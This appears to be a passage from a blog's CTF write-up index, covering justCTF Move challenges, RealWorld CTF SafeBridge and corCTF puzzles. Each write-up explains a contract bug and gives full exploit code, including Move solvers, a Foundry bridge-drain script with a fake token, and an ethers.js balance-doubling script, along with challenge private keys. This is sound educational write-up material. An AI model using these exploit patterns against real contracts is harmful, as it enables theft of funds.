&amp;amp;mut QuestBoard, flag: Flag) { let Flag { id, user, flag } = flag; object::delete(id); assert!(table::contains(&amp;amp;board.players, user), NOT_REGISTERED); assert!(flag, NOT_SOLVED); *table::borrow_mut(&amp;amp;mut board.players, user) = true; }... public fun check_winner(board: &amp;amp;QuestBoard, player: address) { assert!(*table::borrow(&amp;amp;board.players, player) == true, NOT_SOLVED); }call buy_flag with 1337 coins and call prove to set the value of player to truedark_brotterhood.move public fun register(sup: &amp;amp;mut OsecSuply&amp;lt;OTTER&amp;gt;, board: &amp;amp;mut QuestBoard, player: address, ctx: &amp;amp;mut TxContext) { assert!(!table::contains(&amp;amp;board.players, player), ALREADY_REGISTERED); table::add(&amp;amp;mut board.players, player, false); transfer::transfer(Player { id: object::new(ctx), user: tx_context::sender(ctx), coins: mint(sup, 137, ctx), // starts with 137 power: 10 }, player); }The server calls register function first, we starts with 137 OTTER coin and the power is 10 public fun buy_sword(vault: &amp;amp;mut Vault&amp;lt;OTTER&amp;gt;, player: &amp;amp;mut Player, ctx: &amp;amp;mut TxContext) { assert!(coin::value(&amp;amp;player.coins) &amp;gt;= 137, WRONG_AMOUNT); let coins = coin::split(&amp;amp;mut player.coins, 137, ctx); coin::join(&amp;amp;mut vault.cash, coins); player.power = player.power + 100; }buy_sword function, we can increase out power with 137 coins #[allow(lint(public_random))] public fun find_a_monster(board: &amp;amp;mut QuestBoard, r: &amp;amp;Random, ctx: &amp;amp;mut TxContext) { assert!(vector::length(&amp;amp;board.quests) &amp;lt;= QUEST_LIMIT, TOO_MUCH_MONSTERS); let mut generator = random::new_generator(r, ctx); let quest = Monster { fight_status: NEW, reward: random::generate_u8_in_range(&amp;amp;mut generator, 13, 37), power: random::generate_u8_in_range(&amp;amp;mut generator, 13, 73) }; vector::push_back(&amp;amp;mut board.quests, quest); }find_a_monster function, we can push Monster objects to quests vector using push_back method. The limit is 25 (QUEST_LIMIT) public fun fight_monster(board: &amp;amp;mut QuestBoard, player: &amp;amp;mut Player, quest_id: u64) { let quest = vector::borrow_mut(&amp;amp;mut board.quests, quest_id); assert!(quest.fight_status == NEW, WRONG_STATE); assert!(player.power &amp;gt; quest.power, BETTER_BRING_A_KNIFE_TO_A_GUNFIGHT); player.power = 10; // sword breaks after fighting the monster :c quest.fight_status = WON; // !! quest.power do not changed }fight_monster’ function, 2 constraints fight_status == NEW ( can only be set in find_a_monster function ) player.power &amp;gt; quest.power ( can only be increased in buy_sword function )It sets player.power to 10 and quest.fight_status to WON public fun return_home(board: &amp;amp;mut QuestBoard, quest_id: u64) { let quest_to_finish = vector::borrow_mut(&amp;amp;mut board.quests, quest_id); assert!(quest_to_finish.fight_status == WON, WRONG_STATE); quest_to_finish.fight_status = FINISHED; // only quest.status }return_home sets fight_status to FINISHED it status is WON ( can only be set in fight_monster function #[allow(lint(self_transfer))] public fun get_the_reward( vault: &amp;amp;mut Vault&amp;lt;OTTER&amp;gt;, board: &amp;amp;mut QuestBoard, player: &amp;amp;mut Player, quest_id: u64, ctx: &amp;amp;mut TxContext, ) { let quest_to_claim = vector::borrow_mut(&amp;amp;mut board.quests, quest_id); assert!(quest_to_claim.fight_status == FINISHED, WRONG_STATE); let monster = vector::pop_back(&amp;amp;mut board.quests); let Monster { fight_status: _, reward: reward, power: _ } = monster; let coins = coin::split(&amp;amp;mut vault.cash, (reward as u64), ctx); coin::join(&amp;amp;mut player.coins, coins); }get_the_reward function, It gets the quest status using quest_id and checks if it’s FINISHED, then It gets monster object with pop_back method and only get reward from it and send that amount to user.If the length of the quest is 1, it works correctly. However, if the length of the quest is greater than 1, the quest being checked and the quest from which the reward is being retrieved become different. Instead of removing the checked quest, the quest from the end of the vector is removed from the vector.By leaving a quest with the FINISHED status at the front of the vector, we can repeatedly call the find_a_monster and get_the_reward functions without fighting the monster to earn 1337 gold.solve.movemodule solve::solve { // [*] Import dependencies use challenge::Otter::{Self, OTTER, Flag}; use sui::random::Random; #[allow(lint(public_random))] public fun solve( _vault: &amp;amp;mut Otter::Vault&amp;lt;OTTER&amp;gt;, _questboard: &amp;amp;mut Otter::QuestBoard, _player: &amp;amp;mut Otter::Player, _r: &amp;amp;Random, _ctx: &amp;amp;mut TxContext, ) { Otter::find_a_monster(_questboard, _r, _ctx); Otter::buy_sword(_vault, _player, _ctx); Otter::fight_monster(_questboard, _player, 0); Otter::return_home(_questboard, 0); let mut i = 0; loop { Otter::find_a_monster(_questboard, _r, _ctx); Otter::get_the_reward(_vault, _questboard, _player, 0, _ctx); i = i + 1; if (i&amp;gt;=100) { break; } }; let flag = Otter::buy_flag(_vault, _player, _ctx); Otter::prove(_questboard, flag); }} justCTF{I_us3d_to_b3_an_ott3r_until_i_t00k_th4t_arr0w}World of Ottercraftgoal public fun buy_flag(ticket: &amp;amp;mut TawernTicket, player: &amp;amp;mut Player) { assert!(player.status == SHOPPING, WRONG_PLAYER_STATE); ticket.total = ticket.total + 537; ticket.flag_bought = true; } public fun checkout(ticket: TawernTicket, player: &amp;amp;mut Player, ctx: &amp;amp;mut TxContext, vault: &amp;amp;mut Vault&amp;lt;OTTER&amp;gt;, board: &amp;amp;mut QuestBoard) { let TawernTicket{ total, flag_bought } = ticket; assert!(total &amp;gt; 0, BUY_SOMETHING); assert!(balance::value&amp;lt;OTTER&amp;gt;(&amp;amp;player.wallet) &amp;gt;= total, WRONG_AMOUNT); let balance = balance::split(&amp;amp;mut player.wallet, total); let coins = coin::from_balance(balance, ctx); coin::join(&amp;amp;mut vault.cash, coins); if (flag_bought == true) { let flag = table::borrow_mut(&amp;amp;mut board.players, tx_context::sender(ctx)); *flag = true; std::debug::print(&amp;amp;std::string::utf8(b&quot;$$$$$$$$$$$$$$$$$$$$$$$$$ FLAG BOUGHT $$$$$$$$$$$$$$$$$$$$$$$$$&quot;)); //debug }; player.status = RESTING; }buy flag with 537 coin and call checkout function. It looks similar to Dark BrOTTERhood challenge but this challenge released earlier. // STATUSES const PREPARE_FOR_TROUBLE: u64 = 1; const ON_ADVENTURE: u64 = 2; const RESTING: u64 = 3; const SHOPPING: u64 = 4; const FINISHED: u64 = 5;there are 5 status. public struct TawernTicket { total: u64, flag_bought: bool } ... public fun enter_tavern(player: &amp;amp;mut Player): TawernTicket { assert!(player.status == RESTING, WRONG_PLAYER_STATE); player.status = SHOPPING; TawernTicket{ total: 0, flag_bought: false } }I think this is import part of my solver code. we should call enter_tavern to buy something. The player will get TawernTicket object by calling this function. we should send ownership by calling checkout function before return. because there’s no drop in TawernTicket. As I know, there’s no way to drop this object without sending it to the checkout function. Idk rust and move this mush ( this is first time for me ) public fun buy_flag(ticket: &amp;amp;mut TawernTicket, player: &amp;amp;mut Player) { assert!(player.status == SHOPPING, WRONG_PLAYER_STATE); ticket.total = ticket.total + 537; ticket.flag_bought = true; } public fun buy_sword(player: &amp;amp;mut Player, ticket: &amp;amp;mut TawernTicket) { assert!(player.status == SHOPPING, WRONG_PLAYER_STATE); player.power = player.power + 213; ticket.total = ticket.total + 140; } public fun buy_shield(player: &amp;amp;mut Player, ticket: &amp;amp;mut TawernTicket) { assert!(player.status == SHOPPING, WRONG_PLAYER_STATE); player.power = player.power + 7; ticket.total = ticket.total + 20; } public fun buy_power_of_friendship(player: &amp;amp;mut Player, ticket: &amp;amp;mut TawernTicket) { assert!(player.status == SHOPPING, WRONG_PLAYER_STATE); player.power = player.power + 9000; //it&#39;s over 9000! ticket.total = ticket.total + 190; }There are 4 items. The shield is the cheapest. only SHOPPING status is allowed ( only set in enter_tavern function ) public fun checkout(ticket: TawernTicket, player: &amp;amp;mut Player, ctx: &amp;amp;mut TxContext, vault: &amp;amp;mut Vault&amp;lt;OTTER&amp;gt;, board: &amp;amp;mut QuestBoard) { let TawernTicket{ total, flag_bought } = ticket; assert!(total &amp;gt; 0, BUY_SOMETHING); assert!(balance::value&amp;lt;OTTER&amp;gt;(&amp;amp;player.wallet) &amp;gt;= total, WRONG_AMOUNT); let balance = balance::split(&amp;amp;mut player.wallet, total); let coins = coin::from_balance(balance, ctx); coin::join(&amp;amp;mut vault.cash, coins); if (flag_bought == true) { let flag = table::borrow_mut(&amp;amp;mut board.players, tx_context::sender(ctx)); *flag = true; std::debug::print(&amp;amp;std::string::utf8(b&quot;$$$$$$$$$$$$$$$$$$$$$$$$$ FLAG BOUGHT $$$$$$$$$$$$$$$$$$$$$$$$$&quot;)); //debug }; player.status = RESTING; }checkout, all status is allowed. player.status = RESTING public fun find_a_monster(board: &amp;amp;mut QuestBoard, player: &amp;amp;mut Player) { // RESTING, PREPARE_FOR_TROUBLE assert!(player.status != SHOPPING &amp;amp;&amp;amp; player.status != FINISHED &amp;amp;&amp;amp; player.status != ON_ADVENTURE, WRONG_PLAYER_STATE); assert!(vector::length(&amp;amp;board.quests) &amp;lt;= QUEST_LIMIT, TOO_MANY_MONSTERS); // verify with quest length, so can always get rewarad:100, power:73 let quest = if (vector::length(&amp;amp;board.quests) % 3 == 0) { Monster { reward: 100, power: 73 } } else if (vector::length(&amp;amp;board.quests) % 3 == 1) { Monster { reward: 62, power: 81 } } else { Monster { reward: 79, power: 94 } }; vector::push_back(&amp;amp;mut board.quests, quest); player.status = PREPARE_FOR_TROUBLE; }find_a_monster, we can push Monster object to quests vector. only RESTING, PREPARE_FOR_TROUBLE status are allowed. player.status = PREPARE_FOR_TROUBLE public fun bring_it_on(board: &amp;amp;mut QuestBoard, player: &amp;amp;mut Player, quest_id: u64) { // PREPARE_FOR_TROUBLE assert!(player.status != SHOPPING &amp;amp;&amp;amp; player.status != FINISHED &amp;amp;&amp;amp; player.status != RESTING &amp;amp;&amp;amp; player.status != ON_ADVENTURE, WRONG_PLAYER_STATE); let monster = vector::borrow_mut(&amp;amp;mut board.quests, quest_id); assert!(player.power &amp;gt; monster.power, BETTER_GET_EQUIPPED); player.status = ON_ADVENTURE; player.power = 10; //equipment breaks after fighting the monster, and friends go to party :c monster.power = 0; //you win! wow! player.quest_index = quest_id; }It gets monster using quest_id and checks power, then set monster&#39;s power to 0, quest_index to quest_id. only PREPARE_FOR_TROUBLE status is allowed. public fun return_home(board: &amp;amp;mut QuestBoard, player: &amp;amp;mut Player) { // ON_ADVENTURE assert!(player.status != SHOPPING &amp;amp;&amp;amp; player.status != FINISHED &amp;amp;&amp;amp; player.status != RESTING &amp;amp;&amp;amp; player.status != PREPARE_FOR_TROUBLE, WRONG_PLAYER_STATE); let quest_to_finish = vector::borrow(&amp;amp;board.quests, player.quest_index); assert!(quest_to_finish.power == 0, WRONG_AMOUNT); player.status = FINISHED; }return_home, It gets quest using player.quest_index ( set in bring_it_on function ) and checks power==0. only ON_ADVENTURE status is allowed. public fun get_the_reward(vault: &amp;amp;mut Vault&amp;lt;OTTER&amp;gt;, board: &amp;amp;mut QuestBoard, player: &amp;amp;mut Player, ctx: &amp;amp;mut TxContext) { // FINISHED, SHOPPING assert!(player.status != RESTING &amp;amp;&amp;amp; player.status != PREPARE_FOR_TROUBLE &amp;amp;&amp;amp; player.status != ON_ADVENTURE, WRONG_PLAYER_STATE); let monster = vector::remove(&amp;amp;mut board.quests, player.quest_index); let Monster { // do not check monster power reward: reward, power: _ } = monster; let coins = coin::split(&amp;amp;mut vault.cash, reward, ctx); let balance = coin::into_balance(coins); balance::join(&amp;amp;mut player.wallet, balance); player.status = RESTING; }get_the_reward, It’s different from previous challenge. It uses remove using player.quest_index as index, not pop_back.Not only the FINISHED status from return_home, but also the SHOPPING status is allowed. In vector::remove, if we delete index 0, index 0 now points to the element that was previously at index 1. There’s no check of the power of monster. So we can collect all rewards in the quest vector by killing only the monster at index 0.It seems we can call get_the_reward, enter_tavern function repeatedly. But as I mentioned above, we must send transfer ownership of ticket object to checkout function before return. So we should call the functions in the following order buy sword fill the vector with monsters until LIMIT (25) kill monster at index 0 repeat below enter_tavern buy_shield -&amp;gt; Cheapest. Just to bypass assert!(total &amp;gt; 0, BUY_SOMETHING);. get_the_reward checkout -&amp;gt; transfer ownership of ticketAll of the monsters’ rewards are lower than the price of a shield, so we can get 537 coins.solve.move#[allow(unused, unused_use, unused_variable, duplicate_alias)]module solve::solve { // [*] Import dependencies use challenge::Otter::{Self, OTTER, QuestBoard, Vault, Player, TawernTicket}; public fun solve( board: &amp;amp;mut QuestBoard, vault: &amp;amp;mut Vault&amp;lt;OTTER&amp;gt;, player: &amp;amp;mut Player, ctx: &amp;amp;mut TxContext ) { let mut ticket = Otter::enter_tavern(player); Otter::buy_sword(player, &amp;amp;mut ticket); Otter::checkout(ticket, player, ctx, vault, board); let mut i = 0; loop { Otter::find_a_monster(board, player); i = i + 1; if (i &amp;gt;= 25) { break; } }; Otter::bring_it_on(board, player, 0); Otter::return_home(board, player); Otter::get_the_reward(vault, board, player, ctx); i = 0; loop { let mut ticket = Otter::enter_tavern(player); Otter::buy_shield(player, &amp;amp;mut ticket); Otter::get_the_reward(vault, board, player, ctx); Otter::checkout(ticket, player, ctx, vault, board); i = i + 1; if (i &amp;gt;= 24) { break; } }; let mut ticket = Otter::enter_tavern(player); Otter::buy_flag(&amp;amp;mut ticket, player); Otter::checkout(ticket, player, ctx, vault, board); }} justCTF{Ott3r_uses_expl0it_its_sup3r_eff3ctiv3}" }, { "title": "(CTF) realworld CTF 2024 writeup (SafeBridge)", "url": "/posts/(ctf)-2024-realworldctf/", "categories": "CTF, WEB3", "tags": "writeup, web3", "date": "2024-01-30 17:02:13 +0900", "snippet": "web3 newbie’s solver for SafeBridge in rwctf 2024ObjectiveDrain the BRIDGE (L1ERC20Bridge) of its WETH balance.SetupThe challenge setup is using the challenge.py file, with relayer.py also running in the background.There appear to be two instances each of l1 and l2, with each instance holding 1000 ether.action? 1creating private blockchain...deploying challenge...your private blockchain has been set upit will automatically terminate in 1440 seconds---rpc endpoints: - http://47.251.56.125:8545/pmHYxNUDhqdMRFkcBhvEeMVm/l1 - http://47.251.56.125:8545/pmHYxNUDhqdMRFkcBhvEeMVm/l2private key: 0x89fbaf7272d5f581e07ec0315d3be44906ff75ebfbd953528e3874351d8230a6challenge contract: 0x723516b4d13F4D5E7Cc4bCd6ccE9f6eb584da5e6The setup is configured as shown above.challenge.pyLet’s start by examining the challenge setup: Deployment is done via the Deploy.s.sol script. 2 ether is approved for L1ERC20Bridge followed by a call to depositERC20. This action transfers WETH to L1ERC20Bridge and triggers a message to call L2ERC20Bridge.finalizeDeposit. More on this later. A precompiled contract is deployed:library Lib_PredeployAddresses { address internal constant L2_CROSS_DOMAIN_MESSENGER = 0x420000000000000000000000000000000000CAFe; address internal constant L2_ERC20_BRIDGE = 0x420000000000000000000000000000000000baBe; address internal constant L2_WETH = payable(0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000);}Next, we’ll delve into the token transfer method by examining the relayer.py file.relayer.pyThread( target=self._relayer_worker, args=(l1, l1_messenger, l2_messenger)).start()Thread( target=self._relayer_worker, args=(l2, l2_messenger, l1_messenger)).start()Workers operate on l1_messenger and l2_messenger respectively.def _relayer_worker( self, src_web3: Web3, src_messenger: Contract, dst_messenger: Contract): _src_chain_id = src_web3.eth.chain_id _last_processed_block_number = 0 while True: try: latest_block_number = src_web3.eth.block_number if _last_processed_block_number &amp;gt; latest_block_number: _last_processed_block_number = latest_block_number print( f&quot;chain {_src_chain_id} syncing {_last_processed_block_number + 1} {latest_block_number}&quot; ) for i in range( _last_processed_block_number + 1, latest_block_number + 1 ): _last_processed_block_number = i logs = src_messenger.events.SentMessage().get_logs( fromBlock=i, toBlock=i ) for log in logs: print(f&quot;chain {_src_chain_id} got log {src_web3.to_json(log)}&quot;) try: tx_hash = dst_messenger.functions.relayMessage( log.args[&quot;target&quot;], log.args[&quot;sender&quot;], log.args[&quot;message&quot;], log.args[&quot;messageNonce&quot;], ).transact() dst_messenger.w3.eth.wait_for_transaction_receipt(tx_hash) print( f&quot;chain {_src_chain_id} relay message hash: {tx_hash.hex()} src block number: {i}&quot; ) time.sleep(1) except Exception as e: print(e) except: traceback.print_exc() pass finally: time.sleep(1)The worker checks src events every second and then calls relayMessage on the destination.AnalysisL1→L2 Token Deposit WETH Deposit &amp;amp; Approval Calling L1Bridge::depositERC20(weth,l2_weth,amount) Transfers tokens from msg.sender to the bridge. If l1token == weth, it triggers L2bridge:finalizeDeposit(0,l2_weth,from,to,amount). Otherwise, it triggers L2bridge:finalizeDeposit(l1token,l2token,from,to,amount). This sends a message to L2TokenBridge and updates deposits[l1token][l2token]. A problem arises when l1token→weth and l2token→other token. The deposit on L2 is made to L2_WETH, but the record in deposits is to the address of the other token. Relayer Acceptance Checks L1 events and calls relayMessage on L2. Hashes the calldata, sets xDomainMessageSender → msg.sender, and then calls. In finalizeDeposit, checks if it is L1TokenBridge and then mints L2token. L2→L1 Token Withdrawal Burn L2token Encode Message If L2Token==L2_WETH, it triggers L1Bridge::finalizeWethWithdrawal(from,to,amount). Otherwise, it triggers L1Bridge::finalizeERC20Withdrawal(L1token,L2token,from,to,amount). Relayer Acceptance Checks L2 events and calls relayMessage on L1. finalizeERC20Withdrawal reduces deposits[l1token][l2token]. Executes IERC20(L1Token).safeTransfer(to,amount). Current Balance Situation# L1_wethL1Bridge: 2 ether# depositsL1_weth → L2_weth: 2 ether# L2_wethL2Bridge: 2 etherPotential Race Condition?Race conditions seem unlikely, but could they be a factor? The worker checks for events in the block, waits 1 second per event, and remains pending until the transaction finalizes. Could disrupting the sync create a race condition? The sendMessage function allows arbitrary calls (msg.sender = crossDomainMessenger), but finalizeERC20Withdrawal and deposits aren’t possible. What about using a fakeL1/L2 token? This could extend beyond just the L1weth ↔ L2weth pair to include L1weth ↔ L2fake.(bool success,) = _target.call(_message);Can we interact with the token using this part of relayMessage (msg.sender = relayer)? It seems unrelated to tokens.Root Causefunction _initiateERC20Deposit(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount) internal{ IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount); bytes memory message; if (_l1Token == weth) { message = abi.encodeWithSelector( IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.L2_WETH, _from, _to, _amount ); } else { message = abi.encodeWithSelector(IL2ERC20Bridge.finalizeDeposit.selector, _l1Token, _l2Token, _from, _to, _amount); } sendCrossDomainMessage(l2TokenBridge, message); deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount; emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount);}The _initateERC20Deposit function behaves in a specific way: Regardless of the L2 token, if the L1 token is weth, the event message sent to L2 will make the deposit to L2:WETH. However, a different L2 token can be recorded in the deposits mapping storage. Deploying a fakeL2 token on L2 and giving the user enough of that token allows for manipulationExploit [L2] Create a fake L2 token. [L1] Send L1_weth → L2_fake (effectively sending L1_weth → L2_weth). [L2] Withdraw L2_weth → L1_weth (2 ether). [L2] Withdraw L2_fake → L1_weth (2 ether).pragma solidity ^0.8.20;import {Script,console2} from &quot;forge-std/Script.sol&quot;;import &quot;src/L1/WETH.sol&quot;;import &quot;src/L1/L1CrossDomainMessenger.sol&quot;;import &quot;src/L1/L1ERC20Bridge.sol&quot;;import &quot;src/Challenge.sol&quot;;import &quot;src/L2/standards/L2StandardERC20.sol&quot;;import &quot;src/L2/L2ERC20Bridge.sol&quot;;import {Lib_PredeployAddresses} from &quot;src/libraries/constants/Lib_PredeployAddresses.sol&quot;;import {ERC20} from &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;import &quot;src/L2/standards/IL2StandardERC20.sol&quot;;import {ERC20} from &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;contract Solve is Script { L2Fake fake; Challenge challenge; L1ERC20Bridge l1Bridge; WETH weth; function setUp() public {} function get_info() public { console2.log(&quot;msg.sender&quot;, msg.sender); vm.startBroadcast(); challenge = Challenge(vm.envAddress(&quot;CHALLENGE&quot;)); l1Bridge = L1ERC20Bridge(challenge.BRIDGE()); weth = WETH(payable(address(challenge.WETH()))); console2.log(&quot;challenge&quot;, address(challenge)); console2.log(&quot;l1Bridge&quot;, address(l1Bridge)); console2.log(&quot;weth&quot;, address(weth)); } function create_fake() public { vm.startBroadcast(); weth = WETH(payable(address(vm.envAddress(&quot;WETH&quot;)))); console2.log(&quot;weth&quot;,address(weth)); fake = new L2Fake(address(weth),&quot;fake&quot;,&quot;fake&quot;); console2.log(&quot;fake&quot;,address(fake)); vm.stopBroadcast(); } function run_send_to_fake() public { vm.startBroadcast(); weth = WETH(payable(address(vm.envAddress(&quot;WETH&quot;)))); l1Bridge = L1ERC20Bridge(vm.envAddress(&quot;L1_BRIDGE&quot;)); fake = L2Fake(vm.envAddress(&quot;FAKE&quot;)); console2.log(&quot;address(weth)&quot;,address(weth)); console2.log(&quot;address(l1Bridge)&quot;,address(l1Bridge)); console2.log(&quot;address(fake)&quot;,address(fake)); weth.deposit{value: 2 ether}(); weth.approve(address(l1Bridge), 2 ether); l1Bridge.depositERC20(address(weth), address(fake), 2 ether); console2.log(&quot;user:weth&quot;,weth.balanceOf(address(l1Bridge))); } function run_withdraw() public { vm.startBroadcast(); fake = L2Fake(vm.envAddress(&quot;FAKE&quot;)); console2.log(&quot;address(fake)&quot;,address(fake)); L2ERC20Bridge l2Bridge = L2ERC20Bridge(Lib_PredeployAddresses.L2_ERC20_BRIDGE); console2.log(&quot;address(l2Bridge)&quot;,address(l2Bridge)); l2Bridge.withdraw(Lib_PredeployAddresses.L2_WETH, 2 ether); console2.log(&quot;address(l2Bridge)&quot;,address(l2Bridge)); console2.log(&quot;address(l2Bridge)&quot;,address(l2Bridge.l1TokenBridge())); l2Bridge.withdraw(address(fake), 2 ether); console2.log(&quot;address(l2Bridge)&quot;,address(l2Bridge)); }}contract L2Fake is IL2StandardERC20, ERC20 { address public l1Token; constructor(address _l1Token, string memory _name, string memory _symbol) ERC20(_name, _symbol) { l1Token = _l1Token; _mint(msg.sender, 3 ether); } function supportsInterface(bytes4 _interfaceId) public pure returns (bool) { bytes4 firstSupportedInterface = bytes4(keccak256(&quot;supportsInterface(bytes4)&quot;)); // ERC165 bytes4 secondSupportedInterface = IL2StandardERC20.l1Token.selector ^ IL2StandardERC20.mint.selector ^ IL2StandardERC20.burn.selector; return _interfaceId == firstSupportedInterface || _interfaceId == secondSupportedInterface; } function mint(address _to, uint256 _amount) public { _mint(_to, _amount); emit Mint(_to, _amount); } function burn(address _from, uint256 _amount) public { _burn(_from, _amount); emit Burn(_from, _amount); }}Considerations I’m not much familiar with foundry so I executed each function one by one, changing the L2 and L1 rpc accordingly. So I couldn’t shared variables so I manually updated environment variables per call. Deploying an attacker contract seems like a more efficient to writing the code. The last run_withdraw function couldn’t run in foundry due to its use of a precompiled address. I should called withdraw function using cast" }, { "title": "(CTF) corCTF 2023 writeup (diophantus,babyWallet,utterly-tangled)", "url": "/posts/(ctf)-2023-corctf/", "categories": "CTF", "tags": "writeup", "date": "2023-07-31 18:34:08 +0900", "snippet": "corCTF twitterparticipated with cat :flag_kr: and placed 3rdblockchain/baby-wallet (24 solves)//SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.17;// 100 ethercontract BabyWallet { mapping(address =&amp;gt; uint256) public balances; mapping(address =&amp;gt; mapping(address =&amp;gt; uint256)) public allowances; function deposit() public payable { balances[msg.sender] += msg.value; } function withdraw(uint256 amt) public { // check effect interaction require(balances[msg.sender] &amp;gt;= amt, &quot;You can&#39;t withdraw that much&quot;); balances[msg.sender] -= amt; (bool success, ) = msg.sender.call{value: amt}(&quot;&quot;); require(success, &quot;Failed to withdraw that amount&quot;); } function approve(address recipient, uint256 amt) public { allowances[msg.sender][recipient] += amt; } ... function transferFrom(address from, address to, uint256 amt) public { uint256 allowedAmt = allowances[from][msg.sender]; uint256 fromBalance = balances[from]; uint256 toBalance = balances[to]; require(fromBalance &amp;gt;= amt, &quot;You can&#39;t transfer that much&quot;); require(allowedAmt &amp;gt;= amt, &quot;You don&#39;t have approval for that amount&quot;); balances[from] = fromBalance - amt; balances[to] = toBalance + amt; allowances[from][msg.sender] = allowedAmt - amt; } ...}The goal is to steal all ether (100 ether) from the BabyWallet contract.User starts with 5000 ether.the vulnerability is in the transferFrom function.If from equals to to,balances[from] = fromBalance - amt;balances[to] = toBalance + amt;the User can add amt to their balance ( Users must deposit an amount equal to or greater than amt )I think I saw this vuln on Twitter.balances[from] -= amt;balances[to] += amt;And thought this code will be safe.the exploit flow: deposit 100 ether approve user 100 ether transfer user to user with 100 ether withdraw 200 etherexploit.jsconst ethers = require(&#39;ethers&#39;);const fs = require(&#39;fs&#39;);url = &#39;https://baby-wallet.be.ax/381a0939-1e95-42dd-9cda-70a2880adf7b&#39;user = &#39;0xE374b91523278549A86a7d3c1b9Cf4B918F1063d&#39;pvKey = &#39;0x450dbd4c36847123df88f1aec977197cba7dd676a725a70bd4fc3ce023a95dee&#39;setupAddr = &#39;0x3efA52920e554DF6A8738A717450598f0e3202c4&#39;;// default wallet/*ticket{401a09c398b4015b20178132cabba425}uuid: 381a0939-1e95-42dd-9cda-70a2880adf7brpc endpoint: https://baby-wallet.be.ax/381a0939-1e95-42dd-9cda-70a2880adf7bprivate key: 0x450dbd4c36847123df88f1aec977197cba7dd676a725a70bd4fc3ce023a95deeyour address: 0xE374b91523278549A86a7d3c1b9Cf4B918F1063dsetup contract: 0x3efA52920e554DF6A8738A717450598f0e3202c4*/async function main() { provider = new ethers.providers.JsonRpcProvider(url); const signer = new ethers.Wallet( pvKey, provider ) console.log(ethers.utils.formatUnits(await provider.getBalance(user)).toString()); setupAbi = JSON.parse(fs.readFileSync(&#39;./out/Setup.sol/Setup.json&#39;, &#39;utf8&#39;))[&#39;abi&#39;]; walletAbi = JSON.parse(fs.readFileSync(&#39;./out/BabyWallet.sol/BabyWallet.json&#39;, &#39;utf8&#39;))[&#39;abi&#39;]; const setup = new ethers.Contract(setupAddr, setupAbi, signer); const walletAddr = await setup.wallet(); const wallet = new ethers.Contract(walletAddr, walletAbi, signer); await wallet.deposit({value: ethers.utils.parseEther(&#39;100&#39;)}); await wallet.approve(user, ethers.utils.parseEther(&#39;100&#39;)); await wallet.transferFrom(user,user,ethers.utils.parseEther(&#39;100&#39;)); console.log((await wallet.balances(user)).toString()); await wallet.withdraw(ethers.utils.parseEther(&#39;200&#39;)); console.log((await provider.getBalance(walletAddr)).toString());}main(); corctf{inf1nite_m0ney_glitch!!!}rev/utterly-deranged (60 solves)The huge binary is given. It can’t be decompiled with IDA because it has too many dummy codes that makes branchesthese codes (test,jnz,jmp) can be removed with nop.I patched the code. if the target address of jmp is 0x416948 or larger, it can be replaced with nop.patch.pyimport refrom pwn import *context.arch=&quot;amd64&quot;f = open(&quot;./utterlyderanged&quot;,&quot;rb&quot;).read()main = f[0x1170:0x16935]BASE = 0x401170MAIN_END = 0x416900breaking = []breaking.append(re.compile(b&#39;\\x75\\x05\\xe9.{4}&#39;)) # jz &amp;amp; jmpbreaking.append(re.compile(asm(&quot;test rax,1;&quot;)+b&#39;\\x0f.{5}&#39;))breaking.append(re.compile(asm(&quot;test al,1;&quot;)+b&#39;\\x0f.{5}&#39;))breaking.append(re.compile(asm(&quot;test rdx,1;&quot;)+b&#39;\\x0f.{5}&#39;))breaking.append(re.compile(asm(&quot;test dl,1;&quot;)+b&#39;\\x0f.{5}&#39;))breaking.append(re.compile(asm(&quot;test rcx,1;&quot;)+b&#39;\\x0f.{5}&#39;))breaking.append(re.compile(asm(&quot;test cl,1;&quot;)+b&#39;\\x0f.{5}&#39;))breaking.append(re.compile(asm(&quot;test rdi,1;&quot;)+b&#39;\\x0f.{5}&#39;))breaking.append(re.compile(asm(&quot;test dil,1;&quot;)+b&#39;\\x0f.{5}&#39;))for b in breaking: idxes = list(b.finditer(main)) for idx in idxes: start,end = idx.span() opcodes = idx.group() addr = u32(opcodes[-4:])+start+BASE+10 if addr &amp;gt; MAIN_END: main = main[:start]+b&#39;\\x90&#39;*(end-start)+main[end:]strange = []strange.append(asm(&quot;test rax,1;nop;&quot;))strange.append(asm(&quot;test al,1;nop;&quot;))strange.append(asm(&quot;test rdx,1;nop;&quot;))strange.append(asm(&quot;test dl,1;nop;&quot;))strange.append(asm(&quot;test rcx,1;nop;&quot;))strange.append(asm(&quot;test cl,1;nop;&quot;))strange.append(asm(&quot;test rdi,1;nop;&quot;))strange.append(asm(&quot;test dl,1;nop;&quot;))for s in strange: idxes = list(re.finditer(s,main)) for idx in idxes: start,end = idx.span() main = main[:start]+b&#39;\\x90&#39;*(end-start)+main[end:]out = f[:0x1170]+main+f[0x16935:]print(len(out))with open(&quot;./utterlyderanged_patched&quot;,&quot;wb&quot;) as f: f.write(out)Now the binary can be decompiled. It has some logic that generate xor table and just xor with input and compare with some data.I just dumped that xor table and xored with some data.xor table. bp at 0x0000000000414F87 corctf{s331ng_thru_my_0p4qu3_pr3d1c4t35}rev/diophantus (9 solves)The binary compiled with Rust is given.It was hard time to analysis the logic due to hidden logic due to decompiler after calling encrypt_ntt function_$LT$core..slice..iter..IterMut$LT$T$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::for_each::h034ba2e141d3316a-&amp;gt; encrypt::main::_$u7b$$u7b$closure$u7d$$u7d$::haec5bb9b009b33ffdef encrypt_ntt(key,buf): if len(buf)==1: return even_array = [0] * (len(buf)//2) odd_array = [0] * (len(buf)//2) for i in range(len(buf)//2): even_array[i] = buf[i*2] odd_array[i] = buf[i*2+1] encrypt_ntt(key,even_array) encrypt_ntt(key,odd_array) mod = pow(key,1&amp;lt;&amp;lt;(16 - int(math.log2(len(buf)))),0x10001) len_div2 = len(buf)&amp;gt;&amp;gt;1 v30 = 1 for i in range(len_div2): v15 = v30 v13 = odd_array[i] * v15 % 0x10001 buf[i] = (even_array[i]+v13) % 0x10001 